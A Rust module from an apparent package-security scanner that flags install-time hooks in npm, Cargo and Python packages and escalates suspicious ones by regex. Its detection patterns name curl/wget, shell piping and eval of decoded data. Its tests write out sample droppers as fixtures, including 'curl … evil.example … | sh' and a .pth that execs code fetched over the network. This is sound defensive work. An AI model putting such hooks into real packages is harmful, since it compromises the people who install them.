//! Detection of install-time code execution hooks.
//!
//! Code that runs when a package is installed or built is how most malicious
//! packages deliver their payload, so every such hook is reported as an
//! [`FindingKind::InstallHook`] finding. Hooks are only looked for at the
//! package root: test fixtures and vendored packages deeper in the tree are
//! never run by the package manager.

use fossdb::{AnalysisFinding, FindingKind, FindingSeverity};
use regex::Regex;
use std::path::{Component, Path, PathBuf};
use std::sync::LazyLock;

/// Largest hook file that will be read for pattern matching.
const MAX_HOOK_FILE_BYTES: u64 = 1_000_000;

/// npm lifecycle scripts that run when the package is installed from the
/// registry. `prepare` is left out: npm only runs it for local and git
/// installs, not for registry tarballs.
const NPM_INSTALL_SCRIPTS: [&str; 3] = ["preinstall", "install", "postinstall"];

/// Patterns in a hook's own text that escalate it to High severity: fetching
/// code from the network, executing decoded data, and persistence.
static SUSPICIOUS_PATTERNS: LazyLock<Vec<(Regex, &'static str)>> = LazyLock::new(|| {
    let specs: &[(&str, &str)] = &[
        (r"\b(?:curl|wget)\b", "downloads with curl/wget"),
        (
            r"(?i)\b(?:Invoke-WebRequest|Invoke-Expression|DownloadString|DownloadFile)\b",
            "PowerShell download or eval",
        ),
        (
            r"\breqwest::|\burllib\.request\b|\burlopen\s*\(|\brequests\.get\s*\(|\bhttps?\.get\s*\(",
            "network access",
        ),
        (
            r"\b(?:eval|exec)\s*\(\s*(?:atob|(?:base64\.)?b64decode|Buffer\.from|codecs\.decode|zlib\.decompress|bytes\.fromhex)\b",
            "evaluates decoded data",
        ),
        (r"\bbase64\s+(?:-d|--decode)\b", "decodes base64 in a shell"),
        (r"\|\s*(?:ba|z)?sh\b", "pipes into a shell"),
        (
            r"\.(?:bashrc|zshrc|bash_profile)\b|\bcrontab\b|\bLaunchAgents\b|CurrentVersion\\+Run",
            "writes to shell or startup configuration",
        ),
    ];

    specs
        .iter()
        .filter_map(|(pattern, reason)| match Regex::new(pattern) {
            Ok(re) => Some((re, *reason)),
            Err(e) => {
                tracing::error!("Invalid install hook pattern {:?}: {}", pattern, e);
                None
            }
        })
        .collect()
});

/// The directory an unpacked archive's package lives in.
///
/// Source tarballs wrap everything in one versioned directory (`package/`,
/// `serde-1.0.210/`, `requests-2.31.0/`); that directory is the root. Wheels
/// and other archives with several top-level entries are rooted at `dir`.
pub(super) fn package_root(dir: &Path) -> PathBuf {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return dir.to_path_buf();
    };
    let entries: Vec<_> = entries.filter_map(|e| e.ok()).take(2).collect();
    match entries.as_slice() {
        [only] if only.file_type().is_ok_and(|t| t.is_dir()) => only.path(),
        _ => dir.to_path_buf(),
    }
}

/// Report every install-time hook found at `root`.
pub(super) fn detect_install_hooks(root: &Path) -> Vec<AnalysisFinding> {
    let mut findings = Vec::new();
    npm_hooks(root, &mut findings);
    cargo_hooks(root, &mut findings);
    python_hooks(root, &mut findings);
    findings
}

fn npm_hooks(root: &Path, findings: &mut Vec<AnalysisFinding>) {
    let Some(manifest) = read_regular_file(&root.join("package.json")) else {
        return;
    };
    let scripts = serde_json::from_str::<serde_json::Value>(&manifest)
        .ok()
        .and_then(|v| v.get("scripts").cloned());
    let script = |name: &str| {
        scripts
            .as_ref()
            .and_then(|s| s.get(name))
            .and_then(|s| s.as_str())
            .map(str::to_string)
    };

    for name in NPM_INSTALL_SCRIPTS {
        if let Some(command) = script(name) {
            findings.push(hook(
                format!("package.json:scripts.{}", name),
                format!("npm {}: {}", name, command),
                FindingSeverity::Low,
                &command,
            ));
        }
    }

    // npm runs `node-gyp rebuild` itself when a package ships a binding.gyp
    // and declares neither an install nor a preinstall script.
    if script("install").is_none()
        && script("preinstall").is_none()
        && is_regular_file(&root.join("binding.gyp"))
    {
        findings.push(hook(
            "binding.gyp".to_string(),
            "npm install: node-gyp rebuild (implicit, binding.gyp present)".to_string(),
            FindingSeverity::Low,
            "",
        ));
    }
}

/// What a Cargo manifest says about build-time code.
#[derive(Debug, Default, PartialEq)]
struct CargoManifestHooks {
    /// `[package] build`: `Some(None)` for `build = false`, `Some(Some(path))`
    /// for an explicit script path, `None` when the key is absent or `true`.
    build: Option<Option<String>>,
    proc_macro: bool,
}

/// Read the `build` and `proc-macro` keys from a Cargo manifest.
///
/// The manifest inside a `.crate` file is the one `cargo package` normalised
/// and wrote out itself, one `key = value` per line under its section header,
/// which keeps a line scan reliable without pulling in a TOML parser.
fn parse_cargo_manifest(manifest: &str) -> CargoManifestHooks {
    let mut hooks = CargoManifestHooks::default();
    let mut section = String::new();

    for line in manifest.lines() {
        let line = line.trim();
        if line.starts_with('[') {
            section = line.trim_matches(|c| c == '[' || c == ']').trim().to_string();
            continue;
        }
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        let (key, value) = (key.trim(), value.trim());
        let value = value.split('#').next().unwrap_or_default().trim();

        match (section.as_str(), key) {
            ("package", "build") => {
                hooks.build = match value {
                    "false" => Some(None),
                    "true" => None,
                    _ => Some(Some(value.trim_matches(|c| c == '"' || c == '\'').to_string())),
                };
            }
            ("lib", "proc-macro" | "proc_macro") => hooks.proc_macro = value == "true",
            _ => {}
        }
    }

    hooks
}

fn cargo_hooks(root: &Path, findings: &mut Vec<AnalysisFinding>) {
    let Some(manifest) = read_regular_file(&root.join("Cargo.toml")) else {
        return;
    };
    let manifest = parse_cargo_manifest(&manifest);

    let script = match manifest.build {
        Some(None) => None,
        Some(Some(path)) => Some(path),
        None => is_regular_file(&root.join("build.rs")).then(|| "build.rs".to_string()),
    };
    if let Some(script) = script {
        let content = if is_contained(&script) {
            read_regular_file(&root.join(&script)).unwrap_or_default()
        } else {
            String::new()
        };
        findings.push(hook(
            script,
            "Cargo build script (runs when the crate is built)".to_string(),
            FindingSeverity::Info,
            &content,
        ));
    }

    if manifest.proc_macro {
        findings.push(hook(
            "Cargo.toml:lib.proc-macro".to_string(),
            "Cargo proc-macro crate (runs inside the compiler)".to_string(),
            FindingSeverity::Info,
            "",
        ));
    }
}

fn python_hooks(root: &Path, findings: &mut Vec<AnalysisFinding>) {
    if let Some(content) = read_regular_file(&root.join("setup.py")) {
        findings.push(hook(
            "setup.py".to_string(),
            "Python setup.py (runs when the sdist is installed)".to_string(),
            FindingSeverity::Low,
            &content,
        ));
    }

    // site.py executes every `.pth` line that starts with `import`, on every
    // interpreter start. Lines that are plain paths only extend sys.path, so a
    // `.pth` without import lines is not a hook.
    let Ok(entries) = std::fs::read_dir(root) else {
        return;
    };
    let mut pth_files: Vec<PathBuf> = entries
        .filter_map(|e| e.ok())
        .map(|e| e.path())
        .filter(|p| p.extension().is_some_and(|ext| ext.eq_ignore_ascii_case("pth")))
        .collect();
    pth_files.sort();

    for path in pth_files {
        let Some(content) = read_regular_file(&path) else {
            continue;
        };
        let executable: Vec<&str> = content
            .lines()
            .filter(|l| l.starts_with("import ") || l.starts_with("import\t"))
            .collect();
        if executable.is_empty() {
            continue;
        }
        let name = path.file_name().unwrap_or_default().to_string_lossy().into_owned();
        findings.push(hook(
            name,
            "Python .pth file with import lines (runs at every interpreter start)".to_string(),
            FindingSeverity::Medium,
            &executable.join("\n"),
        ));
    }
}

/// Build a finding, escalating it to High when `text` matches a suspicious
/// pattern. The matched reasons are appended to the description.
fn hook(
    location: String,
    description: String,
    severity: FindingSeverity,
    text: &str,
) -> AnalysisFinding {
    let reasons: Vec<&str> = SUSPICIOUS_PATTERNS
        .iter()
        .filter(|(re, _)| re.is_match(text))
        .map(|(_, reason)| *reason)
        .collect();

    let (severity, description) = if reasons.is_empty() {
        (severity, description)
    } else {
        (
            FindingSeverity::High,
            format!("{} [suspicious: {}]", description, reasons.join(", ")),
        )
    };

    AnalysisFinding {
        kind: FindingKind::InstallHook,
        severity,
        description,
        location: Some(location),
    }
}

/// True for a relative path that cannot leave the package root.
fn is_contained(path: &str) -> bool {
    Path::new(path)
        .components()
        .all(|c| matches!(c, Component::Normal(_) | Component::CurDir))
}

/// A regular file (not a symlink, which an archive could point anywhere).
fn is_regular_file(path: &Path) -> bool {
    std::fs::symlink_metadata(path).is_ok_and(|m| m.is_file())
}

fn read_regular_file(path: &Path) -> Option<String> {
    let metadata = std::fs::symlink_metadata(path).ok()?;
    if !metadata.is_file() || metadata.len() > MAX_HOOK_FILE_BYTES {
        return None;
    }
    std::fs::read(path)
        .ok()
        .map(|bytes| String::from_utf8_lossy(&bytes).into_owned())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tree(files: &[(&str, &str)]) -> tempfile::TempDir {
        let dir = tempfile::tempdir().unwrap();
        for (name, content) in files {
            let path = dir.path().join(name);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, content).unwrap();
        }
        dir
    }

    fn hooks_of(files: &[(&str, &str)]) -> Vec<AnalysisFinding> {
        let dir = tree(files);
        detect_install_hooks(dir.path())
    }

    fn locations(findings: &[AnalysisFinding]) -> Vec<&str> {
        findings.iter().filter_map(|f| f.location.as_deref()).collect()
    }

    #[test]
    fn npm_install_scripts_are_hooks_but_prepare_is_not() {
        let findings = hooks_of(&[(
            "package.json",
            r#"{"name":"x","scripts":{"postinstall":"node ./scripts/setup.js","prepare":"tsc","test":"jest"}}"#,
        )]);
        assert_eq!(findings.len(), 1, "{:?}", findings);
        let f = &findings[0];
        assert_eq!(f.kind, FindingKind::InstallHook);
        assert_eq!(f.severity, FindingSeverity::Low);
        assert_eq!(f.location.as_deref(), Some("package.json:scripts.postinstall"));
        assert_eq!(f.description, "npm postinstall: node ./scripts/setup.js");
    }

    #[test]
    fn npm_script_fetching_and_piping_to_shell_is_high() {
        let findings = hooks_of(&[(
            "package.json",
            r#"{"scripts":{"preinstall":"curl -s https://evil.example/x | sh"}}"#,
        )]);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, FindingSeverity::High);
        assert!(findings[0].description.contains("downloads with curl/wget"));
        assert!(findings[0].description.contains("pipes into a shell"));
    }

    #[test]
    fn binding_gyp_is_an_implicit_install_unless_one_is_declared() {
        let implicit = hooks_of(&[("package.json", r#"{"name":"x"}"#), ("binding.gyp", "{}")]);
        assert_eq!(locations(&implicit), vec!["binding.gyp"]);

        let declared = hooks_of(&[
            ("package.json", r#"{"scripts":{"install":"prebuild-install || node-gyp rebuild"}}"#),
            ("binding.gyp", "{}"),
        ]);
        assert_eq!(locations(&declared), vec!["package.json:scripts.install"]);
    }

    #[test]
    fn cargo_build_script_is_info() {
        let findings = hooks_of(&[
            ("Cargo.toml", "[package]\nname = \"x\"\nbuild = \"build.rs\"\n"),
            ("build.rs", "fn main() { println!(\"cargo:rerun-if-changed=build.rs\"); }"),
        ]);
        assert_eq!(locations(&findings), vec!["build.rs"]);
        assert_eq!(findings[0].severity, FindingSeverity::Info);
    }

    #[test]
    fn cargo_build_script_without_build_key_and_with_custom_path() {
        let implicit = hooks_of(&[("Cargo.toml", "[package]\nname = \"x\"\n"), ("build.rs", "fn main() {}")]);
        assert_eq!(locations(&implicit), vec!["build.rs"]);

        let custom = hooks_of(&[
            ("Cargo.toml", "[package]\nname = \"x\"\nbuild = \"src/build/main.rs\"\n"),
            ("src/build/main.rs", "fn main() {}"),
        ]);
        assert_eq!(locations(&custom), vec!["src/build/main.rs"]);

        let disabled = hooks_of(&[
            ("Cargo.toml", "[package]\nname = \"x\"\nbuild = false\n"),
            ("build.rs", "fn main() {}"),
        ]);
        assert!(disabled.is_empty(), "{:?}", disabled);
    }

    /// The rustdecimal typosquat shipped a build.rs that downloaded its
    /// payload; a build script reaching for curl must stand out from the
    /// ordinary ones.
    #[test]
    fn cargo_build_script_downloading_is_high() {
        let findings = hooks_of(&[
            ("Cargo.toml", "[package]\nname = \"x\"\n"),
            (
                "build.rs",
                "use std::process::Command;\nfn main() { Command::new(\"curl\").arg(\"-o\").arg(\"/tmp/p\").status().unwrap(); }",
            ),
        ]);
        assert_eq!(findings[0].severity, FindingSeverity::High);
    }

    #[test]
    fn build_key_in_another_section_is_ignored() {
        let manifest = "[package]\nname = \"x\"\n\n[features]\nbuild = []\n\n[lib]\nproc-macro = true # yes\n";
        assert_eq!(
            parse_cargo_manifest(manifest),
            CargoManifestHooks { build: None, proc_macro: true }
        );
    }

    #[test]
    fn proc_macro_crate_is_a_hook() {
        let findings = hooks_of(&[("Cargo.toml", "[package]\nname = \"x\"\n\n[lib]\nproc-macro = true\n")]);
        assert_eq!(locations(&findings), vec!["Cargo.toml:lib.proc-macro"]);
        assert_eq!(findings[0].severity, FindingSeverity::Info);
    }

    #[test]
    fn escaping_build_script_path_is_not_read() {
        let dir = tree(&[("pkg/Cargo.toml", "[package]\nbuild = \"../outside.rs\"\n"), ("outside.rs", "curl")]);
        let findings = detect_install_hooks(&dir.path().join("pkg"));
        assert_eq!(locations(&findings), vec!["../outside.rs"]);
        assert_eq!(findings[0].severity, FindingSeverity::Info);
    }

    #[test]
    fn setup_py_is_low_and_exec_of_decoded_data_is_high() {
        let plain = hooks_of(&[("setup.py", "from setuptools import setup\nsetup(name='x', url='https://example.com')\n")]);
        assert_eq!(locations(&plain), vec!["setup.py"]);
        assert_eq!(plain[0].severity, FindingSeverity::Low);

        let dropper = hooks_of(&[("setup.py", "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n")]);
        assert_eq!(dropper[0].severity, FindingSeverity::High);
        assert!(dropper[0].description.contains("evaluates decoded data"));
    }

    #[test]
    fn pth_files_are_hooks_only_with_import_lines() {
        let findings = hooks_of(&[
            ("paths.pth", "/opt/lib\n./vendor\n"),
            ("x-nspkg.pth", "import sys, types, os;has_mfs = sys.version_info > (3, 5)\n"),
            ("evil.pth", "import os; exec(__import__('urllib.request').request.urlopen('http://e/x').read())\n"),
        ]);
        assert_eq!(locations(&findings), vec!["evil.pth", "x-nspkg.pth"]);
        assert_eq!(findings[0].severity, FindingSeverity::High);
        assert_eq!(findings[1].severity, FindingSeverity::Medium);
    }

    #[test]
    fn hooks_below_the_root_are_ignored() {
        let findings = hooks_of(&[
            ("test/fixtures/package.json", r#"{"scripts":{"postinstall":"curl x | sh"}}"#),
            ("vendor/dep/build.rs", "fn main() {}"),
            ("vendor/dep/Cargo.toml", "[package]\nname = \"dep\"\n"),
            ("docs/setup.py", ""),
        ]);
        assert!(findings.is_empty(), "{:?}", findings);
    }

    #[test]
    fn package_root_strips_a_single_top_level_directory() {
        let tarball = tree(&[("left-pad-1.3.0/package.json", "{}")]);
        assert_eq!(package_root(tarball.path()), tarball.path().join("left-pad-1.3.0"));

        let wheel = tree(&[("x/__init__.py", ""), ("x-1.0.dist-info/METADATA", "")]);
        assert_eq!(package_root(wheel.path()), wheel.path());

        let single_file = tree(&[("setup.py", "")]);
        assert_eq!(package_root(single_file.path()), single_file.path());
    }

    #[cfg(unix)]
    #[test]
    fn symlinked_hook_files_are_not_followed() {
        let dir = tree(&[("target.txt", r#"{"scripts":{"postinstall":"x"}}"#)]);
        std::os::unix::fs::symlink(dir.path().join("target.txt"), dir.path().join("package.json")).unwrap();
        assert!(detect_install_hooks(dir.path()).is_empty());
    }
}
